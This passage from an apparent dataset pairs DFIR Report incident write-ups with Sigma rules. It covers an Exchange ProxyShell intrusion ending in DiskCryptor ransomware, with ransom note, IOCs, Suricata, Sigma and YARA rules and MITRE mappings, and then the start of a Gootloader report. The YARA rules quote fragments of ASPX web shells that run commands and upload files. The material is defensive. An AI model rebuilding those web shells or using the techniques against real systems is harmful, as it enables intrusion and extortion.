hard disk, including a system reserved volume and a main NTFS volume. The interface allows users to set a volume password for encryption, with fields to input and confirm the password. There are also options for showing the password and using a keyfile. Additionally, it rates the password strength using categories like 'Unbreakable', 'High', 'Medium', 'Low', and 'Totally Breakable'. The interface includes buttons for mounting and unmounting drives.\nTranscription: |\n  DiskCryptor 1.2 Beta 3\n  \n  Disk Drives\n  Size          Label          Type    Status\n  50.0 MB      Volume1       NTFS    boot\n  69.9 GB      C:            NTFS    sys\n  0 bytes      D:\n  \n  Volume Password\n  Password: [                    ]\n  Confirm:  [                    ]\n  Status: Pass is empty\n  Layout: QWERTY\n  \n  Password Rating\n  Unbreakable      All Other\n  High             Caps Latin\n  Medium           Small Latin\n  Low              Trawlly Breakable\n  \n  [Back] [OK] [Cancel]\n  \n  Symbolic Link: \\Volume{cba8fa7b-0000-0000-0000-300300000000}\n  Device: \\Device\\HarddiskVolume2\n  \n  Cipher: --\n  Encryption mode: --\n  Pkcs5.2 prf\n```\n\nAfter encryption completed, the systems were rebooted and left with the following screen:\n\n```image\nAlt: Encryption Screen\nDescription: The image displays a command line interface with a prompt asking the user to 'Enter password:'. This implies a security measure, likely related to encryption or a ransom note scenario, where the user needs to provide a password to access their files or system.\nTranscription: |\n  Enter password:_\n```\n\nThe threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out. The note pointed to Telegram and ProtonMail contacts.\n\n---\n\n```image\nAlt: Ransom note\nDescription: The image depicts a ransom note left by threat actors after a ransomware attack. It outlines the ransom demand of $8,000 for recovery keys and includes contact information via Telegram and email. The note warns potential victims about the consequences of attempting to restore files with third-party tools and emphasizes the urgency of contacting the attackers within a specified time frame to avoid price increases.\nTranscription: |\n  Lets make a good deal for recovery keys, data and system security issues.\n  The price is 8,000$ for keys.\n  \n  contact us immediately.\n  \n  |----------- Message to This TELEGRAM ID -----------|\n  @\n  |----------- Or Email to -----------|\n  @onionmail.org\n  \n  !!!!!!!!!!!Note: Check your email SPAM folder!!!!!!!!!!!!!\n  |----------- NOTICE -----------|\n  If you do not pay or contact us in 12-hours, new price will be expensive.\n  Your IMPORTANT data copied and ready to sale, in case we can not make a good deal!\n  \n  ************ WARNING ************\n  1. Any attempt to restore your files with third party tools may permanently destroy your files.\n  2. DO NOT rename or modify the files if you really want to restore. JUST the keys can save them.\n```\n\n---\n\n## IOCs\n\nAll artifacts including web shells, files, IPs, etc were added to our servers in September.\n\n### Network\n\n```\nPlink\n148.251.71.182\ntcp.symantecserver.co\n\ndllhost.exe connected to the following IPs over 443\n18.221.115.241\n217.23.5.42\n37.139.3.208\n148.251.71.182\n\nConnected to aspx_gtonvbgidhh.aspx\n198.144.189.74\n86.57.38.156\n```\n\n### File\n\n```\n- dcrypt.exe\n   - md5: 3375fe67827671e121d049f9aabefc3e\n   - SHA1: e5286dbd0a54a110b39eb1e3e7015d82f316132e\n   - SHA256: 02ac3a4f1cfb2723c20f3c7678b62c340c7974b95f8d9320941641d5c6fd2fee\n- dllhost.exe\n   - md5: d4a55e486f5e28168bc4554cffa64ea0\n   - SHA1: 49c222afbe9c610fa75ffbbfb454728e608c8b57\n   - SHA256: e3eac25c3beb77ffed609c53b447a81ec8a0e20fb94a6442a51d72ca9e6f7cd2\n- login.aspx\n   - md5: 7c2b567b659246d2b278da500daa9abe\n   - SHA1: 83d21bb502b73016ec0ad7d6c725d71aaffa0f6d\n   - SHA256: 98ccde0e1a5e6c7071623b8b294df53d8e750ff2fa22070b19a88faeaa3d32b0\n- aspx_gtonvbgidhh.aspx\n   - md5: 34623dc70d274157dbc6e08b21154a3f\n   - SHA1: 3664e6e27fb2784f44f6dba6105ac8b90793032a\n   - SHA256: dc4186dd9b3a4af8565f87a9a799644fce8af25e3ee8777d90ae660d48497a04\n- aspx_qdajscizfzx.aspx\n   - md5: 31f05b4ee52f0512c96d0cc6f158e083\n   - SHA1: ef949770ae46bb58918b0fe127bec0ec300b18a9\n   - SHA256: 60d22223625c86d7f3deb20f41aec40bc8e1df3ab02cf379d95554df05edf55c\n```\n\n## Detections\n\n### Network\n\n```\nET INFO User-Agent (python-requests) Inbound to Webserver\n```\n\n```\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M2 (CVE-2021-34473)\"; flow:established,to_server; content:\"POST\"; http_method; content:\"/autodiscover.json?\"; http_uri; content:\"/PowerShell/\"; distance:0; http_uri; content:\"&X-Rps-CAT=\"; distance:0; fast_pattern; http_uri; content:\"&Email=\"; distance:0; http_uri; content:\"autodiscover/\"; distance:0; within:20; http_uri; reference:cve,2021-34473; classtype:attempted-admin; sid:2033711; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible Microsoft Exchange RCE with Python PSRP Client UA Inbound (CVE-2021-34473)\"; flow:established,to_server; content:\"POST\"; http_method; content:\"/autodiscover/autodiscover.json?\"; http_uri; content:\"Python|20|PSRP|20|Client\"; fast_pattern; http_header; pcre:\"/^User-Agent\\x3a\\x20[^\\r\\n]+Python\\x20PSRP\\x20Client/Hmi\"; reference:cve,2021-34473; classtype:attempted-admin; sid:2033712; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M1 (CVE-2021-34473)\"; flow:established,to_server; content:\"POST\"; http_method; content:\"/ews/exchange.asmx\"; fast_pattern; http_uri; content:\"<s\"; http_client_body; content:\"SerializedSecurityContext>\"; distance:0; http_client_body; content:\"Message>\"; distance:0; http_client_body; content:\"Attachments>\"; distance:0; http_client_body; content:\"Content>\"; distance:0; http_client_body; content:\"|60 c2 ac c2 aa|\"; distance:0; within:200; http_client_body; reference:cve,2021-34473; classtype:attempted-admin; sid:2033684; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_34473, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M2 (CVE-2021-31207)\"; flow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri; content:\"/mapi/nspi\"; nocase; distance:0; fast_pattern; http_uri; content:\"Email=autodiscover/\"; nocase; http_cookie; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033682; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)\nalert tcp [$HOME_NET,$HTTP_SERVERS] any -> any any (msg:\"ET EXPLOIT Vulnerable Microsoft Exchange Server Response (CVE-2021-31207)\"; flow:established,from_server; flowbits:isset,ET.cve.2021.34473; content:\"302\"; http_stat_code; reference:cve,2021-31207; classtype:attempted-admin; sid:2033683; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Microsoft Exchange SUID Disclosure via SSRF Inbound (CVE-2021-31207)\"; flow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri; content:\"Email=autodiscover/\"; nocase; http_uri; content:\"/mapi/emsmdb\"; nocase; distance:0; fast_pattern; http_uri; reference:cve,2021-31207; classtype:attempted-admin; sid:2033701; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_10, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_10;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M1 (CVE-2021-31207)\"; flow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri; fast_pattern; content:\"Email=autodiscover/\"; nocase; http_uri; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033681; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M2 (CVE-2021-34473)\"; flow:established,to_server; content:\"POST\"; http_method; content:\"/autodiscover.json?\"; http_uri; content:\"/PowerShell/\"; distance:0; http_uri; content:\"&X-Rps-CAT=\"; distance:0; fast_pattern; http_uri; content:\"&Email=\"; distance:0; http_uri; content:\"autodiscover/\"; distance:0; within:20; http_uri; reference:cve,2021-34473; classtype:attempted-admin; sid:2033711; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible Microsoft Exchange RCE with Python PSRP Client UA Inbound (CVE-2021-34473)\"; flow:established,to_server; content:\"POST\"; http_method; content:\"/autodiscover/autodiscover.json?\"; http_uri; content:\"Python|20|PSRP|20|Client\"; fast_pattern; http_header; pcre:\"/^User-Agent\\x3a\\x20[^\\r\\n]+Python\\x20PSRP\\x20Client/Hmi\"; reference:cve,2021-34473; classtype:attempted-admin; sid:2033712; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M1 (CVE-2021-34473)\"; flow:established,to_server; content:\"POST\"; http_method; content:\"/ews/exchange.asmx\"; fast_pattern; http_uri; content:\"<s\"; http_client_body; content:\"SerializedSecurityContext>\"; distance:0; http_client_body; content:\"Message>\"; distance:0; http_client_body; content:\"Attachments>\"; distance:0; http_client_body; content:\"Content>\"; distance:0; http_client_body; content:\"|60 c2 ac c2 aa|\"; distance:0; within:200; http_client_body; reference:cve,2021-34473; classtype:attempted-admin; sid:2033684; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_34473, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M2 (CVE-2021-31207)\"; flow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri; content:\"/mapi/nspi\"; nocase; distance:0; fast_pattern; http_uri; content:\"Email=autodiscover/\"; nocase; http_cookie; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033682; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)\nalert tcp [$HOME_NET,$HTTP_SERVERS] any -> any any (msg:\"ET EXPLOIT Vulnerable Microsoft Exchange Server Response (CVE-2021-31207)\"; flow:established,from_server; flowbits:isset,ET.cve.2021.34473; content:\"302\"; http_stat_code; reference:cve,2021-31207; classtype:attempted-admin; sid:2033683; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Microsoft Exchange SUID Disclosure via SSRF Inbound (CVE-2021-31207)\"; flow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri; content:\"Email=autodiscover/\"; nocase; http_uri; content:\"/mapi/emsmdb\"; nocase; distance:0; fast_pattern; http_uri; reference:cve,2021-31207; classtype:attempted-admin; sid:2033701; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_10, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_10;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M1 (CVE-2021-31207)\"; flow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri; fast_pattern; content:\"Email=autodiscover/\"; nocase; http_uri; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033681; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)\n```\n\n### Sigma\n\n- Scheduled Task Creation\n- Webshell Detection With Command Line Keywords\n- System File Execution Location Anomaly\n- File Created with System Process Name\n- Exfiltration and Tunneling Tools Execution\n- Suspicious Plink Remote Forwarding\n- Impacket Lateralization Detection\n- LSASS Memory Dump File Creation\n\n### Yara\n\n```\nValhalla/Loki Yara Sigs\n\nWEBSHELL_ASPX_ProxyShell_Aug21_2\nWEBSHELL_ASPX_ProxyShell_Aug21_2\nSUSP_ASPX_PossibleDropperArtifact_Aug21\nSUSP_ASPX_PossibleDropperArtifact_Aug21\n```\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2021-11-14\n   Identifier: 6898\n   Reference: https://thedfirreport.com\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule sig_6898_login_webshell {\n   meta:\n      description = \"6898 - file login.aspx\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2021-11-14\"\n      hash1 = \"98ccde0e1a5e6c7071623b8b294df53d8e750ff2fa22070b19a88faeaa3d32b0\"\n   strings:\n      $s1 = \"&lt;asp:TextBox id='xpath' runat='server' Width='300px'&gt;c:\\\\windows\\\\system32\\\\cmd.exe&lt;/asp:TextBox&gt;        \" fullword ascii\n      $s2 = \"myProcessStartInfo.UseShellExecute = false            \" fullword ascii\n      $s3 = \"\\\"Microsoft.Exchange.ServiceHost.exe0r\" fullword ascii\n      $s4 = \"myProcessStartInfo.Arguments=xcmd.text            \" fullword ascii\n      $s5 = \"myProcess.StartInfo = myProcessStartInfo            \" fullword ascii\n      $s6 = \"myProcess.Start()            \" fullword ascii\n      $s7 = \"myProcessStartInfo.RedirectStandardOutput = true            \" fullword ascii\n      $s8 = \"myProcess.Close()                       \" fullword ascii\n      $s9 = \"Dim myStreamReader As StreamReader = myProcess.StandardOutput            \" fullword ascii\n      $s10 = \"&lt;%@ import Namespace='system.IO' %&gt;\" fullword ascii\n      $s11 = \"&lt;%@ import Namespace='System.Diagnostics' %&gt;\" fullword ascii\n      $s12 = \"Dim myProcess As New Process()            \" fullword ascii\n      $s13 = \"Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            \" fullword ascii\n      $s14 = \"example.org0\" fullword ascii\n      $s16 = \"&lt;script runat='server'&gt;      \" fullword ascii\n      $s17 = \"&lt;asp:TextBox id='xcmd' runat='server' Width='300px' Text='/c whoami'&gt;/c whoami&lt;/asp:TextBox&gt;        \" fullword ascii\n      $s18 = \"&lt;p&gt;&lt;asp:Button id='Button' onclick='runcmd' runat='server' Width='100px' Text='Run'&gt;&lt;/asp:Button&gt;        \" fullword ascii\n      $s19 = \"Sub RunCmd()            \" fullword ascii\n   condition:\n      uint16(0) == 0x8230 and filesize < 6KB and\n      8 of them\n}\n\nrule aspx_gtonvbgidhh_webshell {\n   meta:\n      description = \"6898 - file aspx_gtonvbgidhh.aspx\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2021-11-14\"\n      hash1 = \"dc4186dd9b3a4af8565f87a9a799644fce8af25e3ee8777d90ae660d48497a04\"\n   strings:\n      $s1 = \"info.UseShellExecute = false;\" fullword ascii\n      $s2 = \"info.Arguments = \\\"/c \\\" + command;\" fullword ascii\n      $s3 = \"var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));\" fullword ascii\n      $s4 = \"info.FileName = \\\"powershell.exe\\\";\" fullword ascii\n      $s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword ascii\n      $s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword ascii\n      $s7 = \"httpPostedFile.InputStream.Read(buffer, 0, fileLength);\" fullword ascii\n      $s8 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii\n      $s9 = \"result = result +  Environment.NewLine + \\\"ERROR:\\\" + Environment.NewLine + error;\" fullword ascii\n      $s10 = \"ALAAAAAAAAAAA\" fullword ascii /* base64 encoded string ',' */\n      $s11 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */\n      $s12 = \"var result = delimiter +  this.RunIt(Request.Params[\\\"exec_code\\\"]) + delimiter;\" fullword ascii\n      $s13 = \"AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAA\" ascii /* base64 encoded string ':' */\n      $s14 = \"using (StreamReader streamReader = process.StandardOutput)\" fullword ascii\n      $s15 = \"private string RunIt(string command)\" fullword ascii\n      $s16 = \"Process process = Process.Start(info);\" fullword ascii\n      $s17 = \"ProcessStartInfo info = new ProcessStartInfo();\" fullword ascii\n      $s18 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\" ascii /* base64 encoded string ':' */\n      $s19 = \"6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */\n      $s20 = \"if (Request.Params[\\\"exec_code\\\"] == \\\"put\\\")\" fullword ascii\n   condition:\n      uint16(0) == 0x4221 and filesize < 800KB and\n      8 of them\n}\n\nrule aspx_qdajscizfzx_webshell {\n   meta:\n      description = \"6898 - file aspx_qdajscizfzx.aspx\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2021-11-14\"\n      hash1 = \"60d22223625c86d7f3deb20f41aec40bc8e1df3ab02cf379d95554df05edf55c\"\n   strings:\n      $s1 = \"info.FileName = \\\"cmd.exe\\\";\" fullword ascii\n      $s2 = \"info.UseShellExecute = false;\" fullword ascii\n      $s3 = \"info.Arguments = \\\"/c \\\" + command;\" fullword ascii\n      $s4 = \"var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));\" fullword ascii\n      $s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword ascii\n      $s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword ascii\n      $s7 = \"httpPostedFile.InputStream.Read(buffer, 0, fileLength);\" fullword ascii\n      $s8 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii\n      $s9 = \"result = result +  Environment.NewLine + \\\"ERROR:\\\" + Environment.NewLine + error;\" fullword ascii\n      $s10 = \"ALAAAAAAAAAAA\" fullword ascii /* base64 encoded string ',' */\n      $s11 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */\n      $s12 = \"var result = delimiter +  this.RunIt(Request.Params[\\\"exec_code\\\"]) + delimiter;\" fullword ascii\n      $s13 = \"AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAA\" ascii /* base64 encoded string ':' */\n      $s14 = \"using (StreamReader streamReader = process.StandardOutput)\" fullword ascii\n      $s15 = \"private string RunIt(string command)\" fullword ascii\n      $s16 = \"Process process = Process.Start(info);\" fullword ascii\n      $s17 = \"ProcessStartInfo info = new ProcessStartInfo();\" fullword ascii\n      $s18 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\" ascii /* base64 encoded string ':' */\n      $s19 = \"6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */\n      $s20 = \"if (Request.Params[\\\"exec_code\\\"] == \\\"put\\\")\" fullword ascii\n   condition:\n      uint16(0) == 0x4221 and filesize < 800KB and\n      8 of them\n}\n\nrule sig_6898_dcrypt {\n   meta:\n      description = \"6898 - file dcrypt.exe\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2021-11-14\"\n      hash1 = \"02ac3a4f1cfb2723c20f3c7678b62c340c7974b95f8d9320941641d5c6fd2fee\"\n   strings:\n      $s1 = \"For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline\" fullword wide\n      $s2 = \"Causes Setup to create a log file in the user's TEMP directory.\" fullword wide\n      $s3 = \"Prevents the user from cancelling during the installation process.\" fullword wide\n      $s4 = \"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L\" fullword ascii\n      $s5 = \"Same as /LOG, except it allows you to specify a fixed path/filename to use for the log file.\" fullword wide\n      $s6 = \"/PASSWORD=password\" fullword wide\n      $s7 = \"The Setup program accepts optional command line parameters.\" fullword wide\n      $s8 = \"Overrides the default component settings.\" fullword wide\n      $s9 = \"Specifies the password to use.\" fullword wide\n      $s10 = \"/MERGETASKS=\\\"comma separated list of task names\\\"\" fullword wide\n      $s11 = \"Instructs Setup to load the settings from the specified file after having checked the command line.\" fullword wide\n      $s12 = \"/DIR=\\\"x:\\\\dirname\\\"\" fullword wide\n      $s13 = \"http://diskcryptor.org/                                     \" fullword wide\n      $s14 = \"Prevents Setup from restarting the system following a successful installation, or after a Preparing to Install failure that requ\" wide\n      $s15 = \"HBPLg.sse\" fullword ascii\n      $s16 = \"/LOG=\\\"filename\\\"\" fullword wide\n      $s17 = \"Overrides the default folder name.\" fullword wide\n      $s18 = \"Overrides the default setup type.\" fullword wide\n      $s19 = \"Overrides the default directory name.\" fullword wide\n      $s20 = \"* AVz'\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 5000KB and\n      ( pe.imphash() == \"48aa5c8931746a9655524f67b25a47ef\" or 8 of them )\n}\n```\n\n## MITRE\n\n- Exploit Public-Facing Application – T1190\n- OS Credential Dumping – T1003\n- Network Service Scanning – T1046\n- Remote Desktop Protocol – T1021.001\n- Account Manipulation – T1098\n- Valid Accounts – T1078\n- Protocol Tunneling – T1572\n- Ingress Tool Transfer – T1105\n- Match Legitimate Name or Location – T1036.005\n- Windows Service – T1543.003\n- Data Encrypted for Impact – T1486\n- Web Shell – T1505.003\n- System Information Discovery – T1082\n- System Network Configuration Discovery – T1016\n- System Owner/User Discovery – T1033\n- Windows Command Shell – T1059.003",
    "sigma_rule": {
      "title": "Suspicious Reg Add BitLocker",
      "id": "0e0255bf-2548-47b8-9582-c0955c9283f5",
      "status": "test",
      "description": "Detects suspicious addition to BitLocker related registry keys via the reg.exe utility",
      "references": [
        "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"
      ],
      "author": "frack113",
      "date": "2021-11-15",
      "modified": "2022-09-09",
      "tags": [
        "attack.impact",
        "attack.t1486"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "REG",
            "ADD",
            "\\SOFTWARE\\Policies\\Microsoft\\FVE",
            "/v",
            "/f"
          ],
          "CommandLine|contains": [
            "EnableBDEWithNoTPM",
            "UseAdvancedStartup",
            "UseTPM",
            "UseTPMKey",
            "UseTPMKeyPIN",
            "RecoveryKeyMessageSource",
            "UseTPMPIN",
            "RecoveryKeyMessage"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_bitlocker.yml",
    "id": "413"
  },
  {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story\n\n**Categories:** \ncobaltstrike \ngootloader \nlazagne \npsexec\n\n**Published on:** \nMay 9, 2022\n\n---\n\nIn early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.\n\nThe intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.\n\n## Background\n\nGootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”\n\nWhen the user searches for these phrases and clicks on one of the top results, they are left with a forum-looking web page where the user is instructed to download a file, which they accidentally execute (double click to open). You can learn more about Gootloader by reading these references: \n1. [“Gootloader” expands its payload delivery options](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)\n2. [Gootloader: ‘Initial Access as a Service’ Platform Expands Its Search for High Value Targets](https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/)\n3. [Gootloader](https://redcanary.com/threat-detection-report/threats/gootloader/)\n4. [Gootloader’s “mothership” controls malicious content](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\n\nThe researcher behind the @GootLoaderSites account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!\n\n```image\nAlt: Gootloader Infrastructure\nDescription: The image consists of a series of tweets from the account @GootLoaderSites, detailing current sites associated with the Gootloader malware. Each tweet mentions specific URLs that are serving malicious content, indicating the presence of malware on those sites. The tweets also express a willingness to assist affected parties in cleaning up their sites, highlighting ongoing monitoring and reporting efforts related to Gootloader's operations.\nTranscription: |\n  plaintext\n  GootLoader Sites @GootLoaderSites · Apr 16\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.jlfwealth.com/forum.php\n  \n  GootLoader Sites @GootLoaderSites · Apr 17\n  @JLFwealth FYI your site is delivering malware. Please let me know if you need help cleaning it up, DMs are open.\n  \n  GootLoader Sites @GootLoaderSites · Apr 15\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.joskel.nl/forum.php\n```\n\n## Case Summary\n\nThe intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.\n\nFifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.\n\nAfter pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile, on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.\n\nWith those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.\n\nThe threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.\n\nThe threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.\n\nOn the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case, such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline outlining the events of a cyber incident involving SEO poisoning and the Gootloader malware. It categorizes events by time and provides specific actions taken during the attack, such as 'Gootloader Execution,' 'Lateral Movement,' 'Mimikatz Execution,' and 'RDP Connections.' Each entry includes 